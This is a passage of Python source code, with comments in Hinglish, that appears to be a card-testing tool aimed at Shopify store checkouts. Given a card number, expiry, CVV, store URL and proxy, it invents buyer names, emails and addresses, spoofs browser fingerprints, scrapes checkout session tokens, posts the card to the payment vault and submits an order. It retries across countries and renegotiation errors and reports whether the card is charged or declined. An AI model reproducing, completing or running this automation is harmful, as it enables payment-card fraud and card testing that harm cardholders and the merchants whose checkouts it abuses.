            "provider": cap.get("provider"),
            "challenge": cap.get("challenge"),
            "sitekey": cap.get("sitekey"),
            "token": cap.get("token"),
        }

    sf = seller.get("scriptFingerprint")
    if isinstance(sf, dict):
        variables["scriptFingerprint"] = {
            "signature": sf.get("signature"),
            "signatureUuid": sf.get("signatureUuid"),
            "lineItemScriptChanges": sf.get("lineItemScriptChanges") or [],
            "paymentScriptChanges": sf.get("paymentScriptChanges") or [],
            "shippingScriptChanges": sf.get("shippingScriptChanges") or [],
        }

    tf = seller.get("transformerFingerprintV2")
    if tf:
        variables["transformerFingerprintV2"] = tf

def _pending_ms(seller):
    if not isinstance(seller, dict):
        return 1000
    for k in ("tax", "delivery", "payment", "merchandise"):
        o = seller.get(k) or {}
        if o.get("__typename") == "PendingTerms":
            try:
                return int(o.get("pollDelay") or 1000)
            except (TypeError, ValueError):
                return 1000
    return 1000


# ==============================================================================
#  CORE CHECKOUT
# ==============================================================================


# ==============================================================================
#  COUNTRY FALLBACK  —  delivery UnavailableTerms aaye to next country try karo
# ==============================================================================

FALLBACK_COUNTRIES = ["US", "GB", "CA", "AU", "SG", "DE", "FR", "IE", "IT", "ES",
                      "NL", "NZ", "IN", "AE", "HK", "JP", "SE", "DK", "NO", "PL"]

_EXTRA_BOOK = {
    "IE": {"address1": "1 Grafton Street", "city": "Dublin", "postalCode": "D02 XY45", "zoneCode": "D", "countryCode": "IE", "phone": "16123456"},
    "IT": {"address1": "Via Roma 1", "city": "Milano", "postalCode": "20121", "zoneCode": "MI", "countryCode": "IT", "phone": "0212345678"},
    "ES": {"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "countryCode": "ES", "phone": "911234567"},
    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012", "zoneCode": "NH", "countryCode": "NL", "phone": "201234567"},
    "PT": {"address1": "Rua Augusta 1", "city": "Lisboa", "postalCode": "1100-053", "zoneCode": "LI", "countryCode": "PT", "phone": "211234567"},
    "PL": {"address1": "Marszalkowska 1", "city": "Warszawa", "postalCode": "00-001", "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"},
    "CZ": {"address1": "Vaclavske namesti 1", "city": "Praha", "postalCode": "11000", "zoneCode": "PR", "countryCode": "CZ", "phone": "221234567"},
    "TH": {"address1": "Sukhumvit 1", "city": "Bangkok", "postalCode": "10110", "zoneCode": "BKK", "countryCode": "TH", "phone": "21234567"},
    "MY": {"address1": "Jalan Bukit Bintang 1", "city": "Kuala Lumpur", "postalCode": "55100", "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"},
    "ID": {"address1": "Jalan Sudirman 1", "city": "Jakarta", "postalCode": "10220", "zoneCode": "JK", "countryCode": "ID", "phone": "2112345678"},
    "PH": {"address1": "Ayala Avenue 1", "city": "Makati", "postalCode": "1226", "zoneCode": "NCR", "countryCode": "PH", "phone": "212345678"},
    "KR": {"address1": "Gangnam-daero 1", "city": "Seoul", "postalCode": "06236", "zoneCode": "KR-11", "countryCode": "KR", "phone": "212345678"},
    "TW": {"address1": "Xinyi Road 1", "city": "Taipei", "postalCode": "110", "zoneCode": "TPE", "countryCode": "TW", "phone": "212345678"},
    "ZA": {"address1": "Long Street 1", "city": "Cape Town", "postalCode": "8001", "zoneCode": "WC", "countryCode": "ZA", "phone": "211234567"},
    "IL": {"address1": "Rothschild 1", "city": "Tel Aviv", "postalCode": "6688101", "zoneCode": "TA", "countryCode": "IL", "phone": "312345678"},
    "TR": {"address1": "Istiklal 1", "city": "Istanbul", "postalCode": "34430", "zoneCode": "IST", "countryCode": "TR", "phone": "2121234567"},
    "SA": {"address1": "King Fahd Road 1", "city": "Riyadh", "postalCode": "12271", "zoneCode": "RD", "countryCode": "SA", "phone": "112345678"},
}
book.update(_EXTRA_BOOK)


def _country_candidates(ourl, currency, overrides, cap=6):
    """Pehle user override, phir currency ka country, phir TLD, phir fallback list."""
    if overrides and overrides.get("countryCode"):
        return [str(overrides["countryCode"]).upper()]
    order = []
    ccn = C2C.get((currency or "").upper())
    if ccn and ccn in book and ccn not in order:
        order.append(ccn)
    tcn = urlparse(ourl).netloc.split(".")[-1].upper()
    if tcn in book and tcn not in order:
        order.append(tcn)
    for c in FALLBACK_COUNTRIES:
        if c in book and c not in order:
            order.append(c)
    if not order:
        order = ["US"]
    return order[:cap]


def _apply_addr_to_vars(variables, addr, fn, ln):
    sa = {
        "address1": addr["address1"], "address2": "", "city": addr["city"],
        "countryCode": addr["countryCode"], "postalCode": addr["postalCode"],
        "firstName": fn, "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
    }
    try:
        variables["delivery"]["deliveryLines"][0]["destination"]["partialStreetAddress"] = dict(sa)
    except (KeyError, IndexError, TypeError):
        pass
    try:
        variables["payment"]["billingAddress"]["streetAddress"] = dict(sa)
    except (KeyError, TypeError):
        pass
    try:
        variables["buyerIdentity"]["customer"]["countryCode"] = addr["countryCode"]
        variables["buyerIdentity"]["phoneCountryCode"] = addr["countryCode"]
        variables["buyerIdentity"]["shopPayOptInPhone"]["countryCode"] = addr["countryCode"]
    except (KeyError, TypeError):
        pass


async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                        proxy_str=None, overrides=None, fp=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    ourl = ourl.rstrip("/")

    if fp is None:
        fp = new_fingerprint()

    purl = parse_proxy(proxy_str) if proxy_str else None
    if proxy_str and not purl:
        return False, "Invalid proxy format", gateway, total_price, currency, "Dead"
    pstat = proxy_status_label(proxy_str, purl)

    checkpoint = None
    queue_token = None

    try:
        headers = _checkout_headers(ourl, fp)
        ai = pick_addr(ourl, overrides=overrides)
        cc_code = ai["countryCode"]
        fn, ln = Utils.name()
        email = Utils.email(fn, ln)
        if overrides:
            fn = overrides.get("first") or fn
            ln = overrides.get("last") or ln
            email = overrides.get("email") or email
        phone = ai["phone"]
        street = ai["address1"]
        city = ai["city"]
        state = ai["zoneCode"]
        zipc = ai["postalCode"]

        conn, proxy = build_connector(purl)
        timeout = aiohttp.ClientTimeout(total=REQ_TOTAL_TIMEOUT, sock_connect=10, sock_read=20)

        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            url = ourl

            if not variant_id:
                variant_id = _cache_get(ourl)
            if not variant_id:
                info = await fetch_products(ourl, proxy_str, session=session,
                                            request_proxy=proxy, fp=fp)
                if isinstance(info, tuple) and info[0] is False:
                    if proxy_str and "Proxy" in str(info[1]):
                        pstat = "Dead"
                    return False, info[1], gateway, total_price, currency, pstat
                variant_id = info["variant_id"]
                _cache_set(ourl, variant_id)

            # ---- Step: cart permalink -> checkout document ----
            doc_headers = _document_headers(ourl, fp)
            resp = await session.get(f"{url}/cart/{variant_id}:1", allow_redirects=True,
                                     headers=doc_headers, proxy=proxy)
            checkout_url = str(resp.url)
            text = await resp.text()

            atm = (re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
                   or re.search(r"/checkouts/(?:c/)?([^/?]+)", checkout_url))
            attempt = atm.group(1) if atm else checkout_url.split("/")[-1].split("?")[0]

            sst = (resp.headers.get("X-Checkout-One-Session-Token")
                   or resp.headers.get("x-checkout-one-session-token"))
            if not sst:
                sst = (extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
                       or extract_between(text, 'name="serialized-sessionToken" content="', '"')
                       or extract_between(text, '"serializedSessionToken":"', '"')
                       or extract_between(text, 'data-session-token="', '"'))

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency, pstat

            raw = _unescape(text)
            queue_token = (extract_between(text, "queueToken&quot;:&quot;", "&quot;")
                           or extract_between(text, '"queueToken":"', '"')
                           or extract_between(raw, '"queueToken":"', '"'))
            stable_id = extract_stable_id(text) or str(uuid.uuid4())

            if not sst:
                if "password" in text.lower() and ("enter" in text.lower() or "store" in text.lower()):
                    return False, "Site is password protected", gateway, total_price, currency, pstat
                if resp.status in (429, 430, 503):
                    return False, "RATE_LIMITED", gateway, total_price, currency, pstat
                return False, "CHECKOUT_SESSION_FAILED", gateway, total_price, currency, pstat

            merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
                     or extract_between(text, "ProductVariantMerchandise/", "&q")
                     or extract_between(raw, "ProductVariantMerchandise/", '"')
                     or str(variant_id))

            currency = "USD"
            if "currencyCode&quot;:&quot;" in text:
                currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
            elif '"currencyCode":"' in raw:
                currency = extract_between(raw, '"currencyCode":"', '"') or "USD"

            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', raw)
            if bm:
                build_id = bm.group(1)
            if not build_id:
                bm2 = re.search(r'checkoutWebBuildId":"([^"]+)"', raw)
                build_id = bm2.group(1) if bm2 else ""

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')
            if not source_token:
                sm = re.search(r'checkoutWebSourceId":"([^"]+)"', raw)
                source_token = sm.group(1) if sm else ""

            pci_url = "https://checkout.pci.shopifyinc.com/sessions"
            pm = re.search(r'checkoutCardsinkUrl":"([^"]+)"', raw)
            if pm:
                pci_url = pm.group(1)
                if not pci_url.endswith("/sessions"):
                    pci_url = pci_url.rstrip("/") + "/sessions"

            ident = None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', raw)
            if im:
                ident = im.group(1)

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            gql_host = urlparse(checkout_url).netloc or urlparse(ourl).netloc
            gql_url = f"https://{gql_host}/checkouts/unstable/graphql"
            params = {"operationName": "Proposal"}

            billing = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": cc_code, "postalCode": zipc,
                "firstName": fn, "lastName": ln, "zoneCode": state, "phone": phone,
            }}

            variables = {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queue_token or "",
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"partialStreetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": cc_code, "postalCode": zipc,
                            "firstName": fn, "lastName": ln, "zoneCode": state, "phone": phone,
                        }},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True},
                            },
                            "options": {},
                        },
                        "targetMerchandiseLines": {"any": True},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": True,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "merchandise": {"merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                    }},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }]},
                "payment": {"totalAmount": {"any": True}, "paymentLines": [],
                            "billingAddress": billing},
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": cc_code},
                    "email": email, "emailChanged": False,
                    "phoneCountryCode": cc_code,
                    "marketingConsent": [{"email": {"value": email}}],
                    "shopPayOptInPhone": {"countryCode": cc_code},
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "taxes": _tax_input(None, currency, prefer_any=True),
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
            }

            json_data = {"query": QUERY_PROPOSAL_SHIPPING, "variables": variables,
                         "operationName": "Proposal"}

            # ---- Proposal (country fallback loop) ----
            _cands = _country_candidates(ourl, currency, overrides)
            seller = None
            for _ci, _ctry in enumerate(_cands):
                _addr = pick_addr(ourl, cc=currency, rc=_ctry, overrides=overrides)
                cc_code = _addr["countryCode"]
                street = _addr["address1"]
                city = _addr["city"]
                state = _addr["zoneCode"]
                zipc = _addr["postalCode"]
                phone = _addr["phone"]
                _apply_addr_to_vars(variables, _addr, fn, ln)

                r = await session.post(gql_url, params=params, headers=headers,
                                       json=json_data, proxy=proxy)
                rt = await r.text()
                if is_captcha(rt):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
                try:
                    rj = json.loads(rt)
                except json.JSONDecodeError:
                    return False, _nonjson_code(r.status, rt), gateway, total_price, currency, pstat
                if "errors" in rj and not rj.get("data"):
                    msgs = "; ".join(e.get("message", str(e)) for e in rj["errors"][:3])
                    return False, f"GraphQL Error: {msgs}", gateway, total_price, currency, pstat

                try:
                    sd = rj["data"]["session"]
                    neg = sd["negotiate"]
                    res = neg["result"]
                    rtype = res.get("__typename", "")
                    if rtype == "CheckpointDenied":
                        return False, "Checkpoint Denied", gateway, total_price, currency, pstat
                    if rtype == "Throttled":
                        return False, "Throttled", gateway, total_price, currency, pstat
                    if rtype == "NegotiationResultFailed":
                        return False, "Negotiation failed", gateway, total_price, currency, pstat
                    checkpoint = res.get("checkpointData")
                    queue_token = res.get("queueToken") or queue_token
                    seller = res["sellerProposal"]
                except (KeyError, TypeError) as e:
                    return False, f"Proposal parse error: {e}", gateway, total_price, currency, pstat

                _dl = (seller or {}).get("delivery") or {}
                _dt = _dl.get("__typename")
                # UnavailableTerms = ye country ship nahi karta -> next country
                # Filled / Pending = theek hai, aage badho
                if _dt != "UnavailableTerms":
                    break
                if _ci + 1 >= len(_cands):
                    break

            billing = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": cc_code, "postalCode": zipc,
                "firstName": fn, "lastName": ln, "zoneCode": state, "phone": phone,
            }}
            variables["payment"]["billingAddress"] = billing

            totals = {
                "running_total": ((seller.get("runningTotal") or {}).get("value") or {}).get("amount", "0"),
                "total_price": "0.00",
                "currency": currency,
                "tax_amount": None,
            }
            _, tax_type = _apply_seller_money(seller, totals)
            running_total = totals["running_total"]
            total_price = totals["total_price"]
            currency = totals["currency"]
            tax_amount = totals["tax_amount"]

            ship = {"delivery_strategy": "", "shipping_amount": 0.0,
                    "signed_handle": None, "requires_shipping": True}
            _apply_seller_delivery(seller, ship)
            delivery_strategy = ship["delivery_strategy"]
            signed_handle = ship.get("signed_handle")
            requires_shipping = ship["requires_shipping"]

            _capture_artifacts(seller, variables)

            payment_identifier = None
            pdata = seller.get("payment", {})
            if pdata and pdata.get("__typename") == "FilledPaymentTerms":
                for m in pdata.get("availablePaymentLines", []):
                    pmth = m.get("paymentMethod", {})
                    if pmth.get("paymentMethodIdentifier"):
                        payment_identifier = pmth["paymentMethodIdentifier"]
                        gateway = (pmth.get("extensibilityDisplayName")
                                   or pmth.get("name", "UNKNOWN"))
                        break
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency, pstat

            # ---- Delivery confirm (always) ----
            if requires_shipping:
                variables["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = \
                    _delivery_strategy_input(True, delivery_strategy)
                variables["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = \
                    {"lines": [{"stableId": stable_id}]}
                variables["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {"any": True}
                variables["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            else:
                variables["delivery"] = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stable_id}],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }
            variables["payment"]["billingAddress"] = billing
            variables["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            r = await session.post(gql_url, params=params, headers=headers,
                                   json=json_data, proxy=proxy)
            rt = await r.text()
            if is_captcha(rt):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
            try:
                dj = json.loads(rt)
            except json.JSONDecodeError:
                return False, _nonjson_code(r.status, rt), gateway, total_price, currency, pstat

            dres = dj.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
            dseller = dres.get("sellerProposal") or seller
            if dres.get("queueToken"):
                queue_token = dres["queueToken"]
            if dres.get("checkpointData"):
                checkpoint = dres["checkpointData"]
            _apply_seller_money(dseller, totals)
            running_total = totals["running_total"]
            total_price = totals["total_price"]
            currency = totals["currency"]
            tax_amount = totals["tax_amount"]
            _apply_seller_delivery(dseller, ship)
            _capture_artifacts(dseller, variables)          # 🔥 [PATCH-5]
            delivery_strategy = ship["delivery_strategy"]
            signed_handle = ship.get("signed_handle")
            requires_shipping = ship["requires_shipping"]

            # progressive rate / pending tax wait
            if requires_shipping and (tax_type == "PendingTerms" or not delivery_strategy):
                await asyncio.sleep(min(_pending_ms(dseller), 1500) / 1000.0)
                if requires_shipping and delivery_strategy:
                    variables["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = \
                        _delivery_strategy_input(True, delivery_strategy)
                r = await session.post(gql_url, params=params, headers=headers,
                                       json=json_data, proxy=proxy)
                try:
                    dj2 = json.loads(await r.text())
                    dres2 = dj2.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
                    ds2 = dres2.get("sellerProposal")
                    if dres2.get("queueToken"):
                        queue_token = dres2["queueToken"]
                    if dres2.get("checkpointData"):
                        checkpoint = dres2["checkpointData"]
                    if ds2:
                        _apply_seller_money(ds2, totals)
                        _apply_seller_delivery(ds2, ship)
                        running_total = totals["running_total"]
                        total_price = totals["total_price"]
                        currency = totals["currency"]
                        tax_amount = totals["tax_amount"]
                        delivery_strategy = ship["delivery_strategy"]
                        signed_handle = ship.get("signed_handle")
                        requires_shipping = ship["requires_shipping"]
                except Exception:
                    pass

            if requires_shipping and not delivery_strategy:
                requires_shipping = False

            # ---- PCI token ----
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/",
                "User-Agent": headers["User-Agent"],
                "sec-ch-ua": fp["sec-ch-ua"],
                "sec-ch-ua-mobile": fp["sec-ch-ua-mobile"],
                "sec-ch-ua-platform": fp["sec-ch-ua-platform"],
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if ident:
                vault_headers["shopify-identification-signature"] = ident

            payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{fn} {ln}",
                },
                "payment_session_scope": urlparse(url).netloc,
            }
            token = None
            for pxy in (proxy, None):
                try:
                    rr = await session.post(pci_url, json=payload, headers=vault_headers, proxy=pxy)
                    vt = await rr.text()
                    if vt.strip().startswith("{"):
                        token = json.loads(vt).get("id")
                        if token:
                            break
                except Exception:
                    continue
            if not token:
                return False, "PCI_TOKEN_FAILED", gateway, total_price, currency, pstat

            # ---- Submit ----
            sub_params = {"operationName": "SubmitForCompletion"}

            def _build_sub_vars(tok):
                if requires_shipping:
                    dv = {
                        "deliveryLines": [{
                            "destination": {"streetAddress": {
                                "address1": street, "address2": "", "city": city,
                                "countryCode": cc_code, "postalCode": zipc,
                                "firstName": fn, "lastName": ln,
                                "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": _delivery_strategy_input(
                                True, delivery_strategy, phone),
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    }
                else:
                    dv = {
                        "deliveryLines": [],
                        "noDeliveryRequired": [{"stableId": stable_id}],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    }
                inp = {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token or "",
                    "checkpointData": checkpoint,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": dv,
                    "deliveryExpectations": {
                        "deliveryExpectationLines": (
                            [{"signedHandle": signed_handle}]
                            if (requires_shipping and signed_handle) else []
                        )
                    },
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }]},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {"directPaymentMethod": {
                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId": token,
                                "billingAddress": billing,
                                "cardSource": None,
                            }},
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": billing,
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": cc_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": cc_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": cc_code},
                        "rememberMe": False,
                    },
                    "taxes": _tax_input(tax_amount, currency, prefer_any=(tax_amount is None)),
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "scriptFingerprint": variables.get("scriptFingerprint") or {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                }
                if variables.get("transformerFingerprintV2"):
                    inp["transformerFingerprintV2"] = variables["transformerFingerprintV2"]
                # 🔥 [PATCH-3] required artifacts submit me echo karo
                if variables.get("nonNegotiableTerms"):
                    inp["nonNegotiableTerms"] = variables["nonNegotiableTerms"]
                if variables.get("captcha"):
                    inp["captcha"] = variables["captcha"]
                return {"input": inp, "attemptToken": tok, "metafields": [],
                        "analytics": {"requestUrl": checkout_url}}

            sub_vars = _build_sub_vars(f"{attempt}-{rand_str()}")
            rid = None

            for submit_try in range(3):
                sub_json = {"query": MUTATION_SUBMIT, "variables": sub_vars,
                            "operationName": "SubmitForCompletion"}
                r = await session.post(gql_url, params=sub_params, headers=headers,
                                       json=sub_json, proxy=proxy)
                text = await r.text()
                if is_captcha(text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, pstat
                if ("The requested payment method is not available." in text
                        and '"submitForCompletion"' not in text):
                    return False, "Payment method not available", gateway, total_price, currency, pstat

                try:
                    sj = json.loads(text)
                except json.JSONDecodeError:
                    return False, _nonjson_code(r.status, text), gateway, total_price, currency, pstat

                try:
                    open("/tmp/last_submit.json", "w").write(text)
                except Exception:
                    pass
                sub = (sj.get("data") or {}).get("submitForCompletion") or {}
                if not sub:
                    for e in sj.get("errors", []):
                        c = e.get("code") or (e.get("extensions") or {}).get("code")
                        if c and c != "INVALID_VARIABLE":
                            return False, c, gateway, total_price, currency, pstat
                    return False, f"Empty submit (HTTP {r.status})", gateway, total_price, currency, pstat

                rtype = sub.get("__typename", "")

                if rtype == "SubmitRejected":
                    errs = sub.get("errors") or []
                    codes = [e.get("code") for e in errs if e.get("code")]

                    # 🔥 [PATCH-7] artifacts stale -> fresh negotiate, phir dobara submit
                    if _needs_renagotiate(codes) and submit_try < 2:
                        try:
                            rr = await session.post(gql_url, params=params, headers=headers,
                                                    json=json_data, proxy=proxy)
                            rj2 = json.loads(await rr.text())
                            res2 = rj2["data"]["session"]["negotiate"]["result"]
                            s2 = res2.get("sellerProposal")
                            if res2.get("checkpointData"):
                                checkpoint = res2["checkpointData"]
                            if res2.get("queueToken"):
                                queue_token = res2["queueToken"]
                            if s2:
                                seller = s2
                                _capture_artifacts(s2, variables)
                                _apply_seller_money(s2, totals)
                                _apply_seller_delivery(s2, ship)
                                total_price = totals["total_price"]
                                currency = totals["currency"]
                                tax_amount = totals["tax_amount"]
                                delivery_strategy = ship["delivery_strategy"]
                                signed_handle = ship.get("signed_handle")
                                requires_shipping = ship["requires_shipping"]
                        except Exception as e:
                            print(f"renegotiate refresh fail: {e}")
                        sub_vars = _build_sub_vars(f"{attempt}-{rand_str()}")
                        continue

                    if _reject_needs_accept(codes) and submit_try < 2:
                        try:
                            rr = await session.post(gql_url, params=params, headers=headers,
                                                    json=json_data, proxy=proxy)
                            rj2 = json.loads(await rr.text())
                            res2 = rj2["data"]["session"]["negotiate"]["result"]
                            s2 = res2.get("sellerProposal")
                            if res2.get("checkpointData"):
                                checkpoint = res2["checkpointData"]
                            if res2.get("queueToken"):
                                queue_token = res2["queueToken"]
                            if s2:
                                seller = s2
                                _capture_artifacts(s2, variables)
                                _apply_seller_money(s2, totals)
                                _apply_seller_delivery(s2, ship)
                                total_price = totals["total_price"]
                                currency = totals["currency"]
                                tax_amount = totals["tax_amount"]
                                delivery_strategy = ship["delivery_strategy"]
                                signed_handle = ship.get("signed_handle")
                                requires_shipping = ship["requires_shipping"]
                        except Exception as e:
                            print(f"accept refresh fail: {e}")
                        sub_vars = _build_sub_vars(f"{attempt}-{rand_str()}")
                        continue

                    for e in errs:
                        code = e.get("code", "")
                        loc = e.get("localizedMessage", "")
                        non = e.get("nonLocalizedMessage", "")
                        if code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                            d = loc or non
                            if d:
                                return False, d, gateway, total_price, currency, pstat
                        if code:
                            return False, code, gateway, total_price, currency, pstat
                    return False, "Submit Rejected", gateway, total_price, currency, pstat

                if rtype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = sub.get("receipt", {})
                    rrt = receipt.get("__typename", "")
                    if rrt == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, total_price, currency, pstat
                    if rrt == "ActionRequiredReceipt":
                        return False, "3DS_REQUIRED", gateway, total_price, currency, pstat
                    if rrt == "FailedReceipt":
                        err = receipt.get("processingError", {})
                        if err.get("__typename") == "PaymentFailed":
                            code = err.get("code", "")
                            msg = err.get("messageUntranslated", "")
                            if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                return False, msg, gateway, total_price, currency, pstat
                            return False, code or "PAYMENT_FAILED", gateway, total_price, currency, pstat
                        return False, err.get("__typename") or "UNKNOWN_ERROR", gateway, total_price, currency, pstat
                    rid = receipt.get("id")
                    if not rid:
                        return False, "SubmitSuccess no receipt", gateway, total_price, currency, pstat
                    break

                if rtype == "SubmitFailed":
                    return False, clean_resp(sub.get("reason", "Unknown")), gateway, total_price, currency, pstat
                if rtype == "Throttled":
                    return False, "Throttled", gateway, total_price, currency, pstat
                if rtype == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, total_price, currency, pstat

                receipt = sub.get("receipt", {})
                rid = receipt.get("id")
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency, pstat
                break

            if not rid:
                return False, "No receipt after submit", gateway, total_price, currency, pstat

            # ---- Poll ----
            poll_params = {"operationName": "PollForReceipt"}
            poll_json = {"query": QUERY_POLL,
                         "variables": {"receiptId": rid, "sessionToken": sst},
                         "operationName": "PollForReceipt"}
            for _ in range(5):
                r = await session.post(gql_url, params=poll_params, headers=headers,
                                       json=poll_json, proxy=proxy)
                ft = await r.text()
                if r.status in (429, 430, 503):
                    return False, "RATE_LIMITED", gateway, total_price, currency, pstat
                if is_captcha(ft):
                    return False, "CARD_DECLINED", gateway, total_price, currency, pstat
                try:
                    pj = json.loads(ft)
                except json.JSONDecodeError:
                    return False, "UNPARSEABLE_RESPONSE", gateway, total_price, currency, pstat
                rd = pj.get("data", {}).get("receipt", {})
                if not rd:
                    return False, "EMPTY_POLL_RESPONSE", gateway, total_price, currency, pstat
                tn = rd.get("__typename", "")
                if tn == "ProcessedReceipt":
                    return True, "ORDER_PLACED", gateway, total_price, currency, pstat
                if tn == "FailedReceipt":
                    err = rd.get("processingError", {})
                    et = err.get("__typename", "")
                    if et == "PaymentFailed":
                        code = err.get("code", "")
                        msg = err.get("messageUntranslated", "")
                        if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                            return False, msg, gateway, total_price, currency, pstat
                        return False, code or "PAYMENT_FAILED", gateway, total_price, currency, pstat
                    return False, err.get("code") or et or "UNKNOWN_ERROR", gateway, total_price, currency, pstat
                if tn == "ActionRequiredReceipt":
                    return False, "3DS_REQUIRED", gateway, total_price, currency, pstat
                if tn in ("ProcessingReceipt", "WaitingReceipt"):
                    await asyncio.sleep(min((rd.get("pollDelay", 400) or 400) / 1000.0, POLL_MAX_SLEEP))
                    continue
                return False, f"UNHANDLED_{tn}", gateway, total_price, currency, pstat
            return False, "STILL_PROCESSING", gateway, total_price, currency, pstat

